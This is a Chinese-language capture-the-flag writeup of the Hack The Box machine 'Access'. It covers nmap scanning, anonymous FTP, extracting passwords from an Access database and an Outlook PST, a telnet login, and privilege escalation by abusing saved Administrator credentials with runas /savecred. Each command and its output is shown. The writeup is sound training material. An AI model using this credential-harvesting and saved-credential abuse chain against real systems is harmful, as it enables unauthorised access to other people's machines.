---
title: HTB-Access Writeup
date: 2026-10-23T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - Windows
  - runAs
---
## Nmap 扫描

执行 nmap 扫描，暴露了 3 个开放的 tcp 端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ sudo nmap --min-rate 10000 -p- 10.129.60.37 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-22 22:33 -0400
Nmap scan report for 10.129.60.37
Host is up (0.096s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
```

21 ftp 开放了匿名登录、23 telnet 和 80 Web。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ sudo nmap -sT -sC -sV -O -p21,23,80 10.129.60.37 -oA Nmap/detail
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-22 22:35 -0400
Nmap scan report for 10.129.60.37
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: -1m14s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
```

## ftp 渗透

用 anonymous 登录 ftp，浏览并下载其中的文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ ftp 10.129.60.37
Connected to 10.129.60.37.
220 Microsoft FTP Service
Name (10.129.60.37:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> mget *
mget backup.mdb [anpqy?]? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************************|  5520 KiB  576.80 KiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:09 (573.64 KiB/s)
ftp> cd ../Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> mget *
mget Access Control.zip [anpqy?]? y
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************************************| 10870       14.79 KiB/s    00:00 ETA
226 Transfer complete.
10870 bytes received in 00:00 (14.71 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ ls -liah
total 5.5M
3552802 drwxrwxr-x  3 kali kali 4.0K Oct 22 22:40  .
2759041 drwxrwxr-x 20 kali kali 4.0K Oct 22 22:14  ..
3553023 -rw-rw-r--  1 kali kali  11K Aug 23  2018 'Access Control.zip'
3552964 -rw-rw-r--  1 kali kali 5.4M Aug 23  2018  backup.mdb
3551887 drwxrwxr-x  2 kali kali 4.0K Oct 22 22:35  Nmap
```

解压下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ unzip Access\ Control.zip
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```

用 mdb-tables 查看。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ mdb-tables -1 backup.mdb
acc_antiback
acc_door
acc_firstopen
acc_firstopen_emp
acc_holidays
acc_interlock
acc_levelset
acc_levelset_door_group
acc_linkageio
acc_map
acc_mapdoorpos
acc_morecardempgroup
acc_morecardgroup
acc_timeseg
acc_wiegandfmt
ACGroup
acholiday
ACTimeZones
action_log
AlarmLog
areaadmin
att_attreport
att_waitforprocessdata
attcalclog
attexception
AuditedExc
auth_group_permissions
auth_message
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
base_additiondata
base_appoption
base_basecode
base_datatranslation
base_operatortemplate
base_personaloption
base_strresource
base_strtranslation
base_systemoption
CHECKEXACT
CHECKINOUT
dbbackuplog
DEPARTMENTS
deptadmin
DeptUsedSchs
devcmds
devcmds_bak
django_content_type
django_session
EmOpLog
empitemdefine
EXCNOTES
FaceTemp
iclock_dstime
iclock_oplog
iclock_testdata
iclock_testdata_admin_area
iclock_testdata_admin_dept
LeaveClass
LeaveClass1
Machines
NUM_RUN
NUM_RUN_DEIL
operatecmds
personnel_area
personnel_cardtype
personnel_empchange
personnel_leavelog
ReportItem
SchClass
SECURITYDETAILS
ServerLog
SHIFT
TBKEY
TBSMSALLOT
TBSMSINFO
TEMPLATE
USER_OF_RUN
USER_SPEDAY
UserACMachines
UserACPrivilege
USERINFO
userinfo_attarea
UsersMachines
UserUpdates
worktable_groupmsg
worktable_instantmsg
worktable_msgtype
worktable_usrmsg
ZKAttendanceMonthStatistics
acc_levelset_emp
acc_morecardset
ACUnlockComb
AttParam
auth_group
AUTHDEVICE
base_option
dbapp_viewmodel
FingerVein
devlog
HOLIDAYS
personnel_issuecard
SystemLog
USER_TEMP_SCH
UserUsedSClasses
acc_monitor_log
OfflinePermitGroups
OfflinePermitUsers
OfflinePermitDoors
LossCard
TmpPermitGroups
TmpPermitUsers
TmpPermitDoors
ParamSet
acc_reader
acc_auxiliary
STD_WiegandFmt
CustomReport
ReportField
BioTemplate
FaceTempEx
FingerVeinEx
TEMPLATEEx
```

查看 auth_user 的数据，拿到 engineer 的凭据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

用这个凭据解压 Access Control.zip。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ 7z x -p'access4u@security' -y "Access Control.zip"

7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

Everything is Ok

Size:       271360
Compressed: 10870

┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ ls -liah Access\ Control.pst
3551911 -rw-rw-r-- 1 kali kali 265K Aug 23  2018 'Access Control.pst'
```

这是一个 pst 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ file Access\ Control.pst
Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
```

用 readpst 查看并导出。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access]
└─$ readpst -r -D -o pst_out "Access Control.pst"
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
```

导出了一个文件 mbox。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Access/pst_out]
└─$ tree
.
└── Access Control
    └── mbox

2 directories, 1 file
```

mbox 属于 john。

```bash
┌──(kali㉿kali)-[~/…/Kali/Access/pst_out/Access Control]
└─$ file mbox
mbox: Mailbox text, 1st line "From "john@megacorp.com" Thu Aug 23 19:44:07 2018"
```

查看发现 access 的密码。

```bash
┌──(kali㉿kali)-[~/…/Kali/Access/pst_out/Access Control]
└─$ cat mbox
From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-1495470889_-_-"


----boundary-LibPST-iamunique-1495470889_-_-
Content-Type: multipart/alternative;
	boundary="alt---boundary-LibPST-iamunique-1495470889_-_-"

--alt---boundary-LibPST-iamunique-1495470889_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,



The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.



Regards,

John


--alt---boundary-LibPST-iamunique-1495470889_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
	{font-family:"Cambria Math";
	panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
	{mso-style-priority:99;
	color:#0563C1;
	text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
	{mso-style-priority:99;
	color:#954F72;
	text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
	{mso-style-name:msonormal;
	mso-margin-top-alt:auto;
	margin-right:0in;
	mso-margin-bottom-alt:auto;
	margin-left:0in;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
span.EmailStyle18
	{mso-style-type:personal-compose;
	font-family:"Calibri",sans-serif;
	color:windowtext;}
.MsoChpDefault
	{mso-style-type:export-only;
	font-size:10.0pt;
	font-family:"Calibri",sans-serif;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-1495470889_-_---

----boundary-LibPST-iamunique-1495470889_-_---
```

连接拿到 access。

```bash
┌──(kali㉿kali)-[~/…/Kali/Access/pst_out/Access Control]
└─$ rlwrap -a telnet 10.129.60.37
Trying 10.129.60.37...
Connected to 10.129.60.37.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

## 提权

查看权限，没有可以用的权限。

```bash
C:\Users\security>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

枚举发现 Public 下有一个文件。

```bash
C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)   3,340,140,544 bytes free

```

用 runas 以 administrator 的身份执行命令。

```bash
C:\Users\Public\Desktop>powershell -c "$s=(New-Object -ComObject WScript.Shell).CreateShortcut('C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk'); $s.TargetPath; $s.Arguments; $s.WorkingDirectory"
C:\Windows\System32\runas.exe
/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
C:\ZKTeco\ZKAccess3.5

```

拿到 administrator。

```bash
C:\Apps>runas /savecred /user:ACCESS\Administrator "cmd /c whoami > C:\Apps\whoami.txt 2>&1"

C:\Apps>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Apps

10/23/2026  06:40 AM    <DIR>          .
10/23/2026  06:40 AM    <DIR>          ..
10/23/2026  06:40 AM                22 whoami.txt
               1 File(s)             22 bytes
               2 Dir(s)   3,340,132,352 bytes free

C:\Apps>type whoami.txt
access\administrator
```

```bash
C:\Apps>cmdkey /list


Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator

```
